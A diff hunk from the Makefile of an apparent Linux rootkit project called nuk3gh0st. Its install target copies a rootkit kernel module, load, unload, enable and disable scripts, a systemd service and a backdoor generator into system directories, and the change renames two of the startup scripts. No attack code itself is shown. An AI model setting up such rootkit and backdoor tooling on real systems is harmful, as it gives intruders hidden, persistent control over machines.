@@ -13,8 +13,8 @@ install:
 	-cp rootkit.ko /usr/share/nuk3gh0st/rootkit.ko
 	-cp load-nuk3gh0st /usr/bin/load-nuk3gh0st
 	-cp unload-nuk3gh0st /usr/bin/unload-nuk3gh0st
-	-cp startup-nuk3gh0st /usr/bin/enable-nuk3gh0st
-	-cp rmstartup-nuk3gh0st /usr/bin/disable-nuk3gh0st
+	-cp enable-nuk3gh0st /usr/bin/enable-nuk3gh0st
+	-cp disable-nuk3gh0st /usr/bin/disable-nuk3gh0st
 	-cp nuk3gh0st.startup /usr/share/nuk3gh0st/nuk3gh0st.startup
 	-cp nuk3gh0st.service /usr/share/nuk3gh0st/nuk3gh0st.service
 	-cp backdoor-generator /usr/bin/backdoor-generator
